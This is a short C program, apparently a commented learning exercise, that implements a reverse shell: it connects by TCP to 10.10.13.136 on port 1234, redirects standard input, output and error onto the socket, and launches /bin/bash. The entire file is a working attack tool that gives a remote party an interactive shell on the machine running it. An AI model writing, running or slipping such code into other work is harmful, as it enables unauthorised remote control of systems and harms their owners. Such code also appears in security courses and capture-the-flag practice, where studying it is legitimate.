#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>

int main()
{
	// Create the socket (man socket)
	// AF_INET for IPv4
	// SOCK_STREAM for TCP connection
	// 0 leaves it up to the service provider for protocol, which will be TCP 
	int host_sock = socket(AF_INET, SOCK_STREAM, 0);

	// Create sockaddr_in struct (man 7 ip)
	struct sockaddr_in host_addr;

	// AF_INET for IPv4
	host_addr.sin_family = AF_INET;
	
	// Set connect port number to 1234, set to network byte order by htons
	host_addr.sin_port = htons(1234);

	// IP to connect to, set to network byte order by inet_addr
	host_addr.sin_addr.s_addr = inet_addr("10.10.13.136");
	
	// Connect socket (man connect)
	connect(host_sock, (struct sockaddr *)&host_addr, sizeof(host_addr));
		
	// Loop to redirect STDIN, STDOUT, and STDERR
	int i;
	for(i=0; i<=2; i++) 
		dup2(host_sock, i);
	
	// Execute /bin/sh (man execve)
	execve("/bin/bash", NULL, NULL);

}

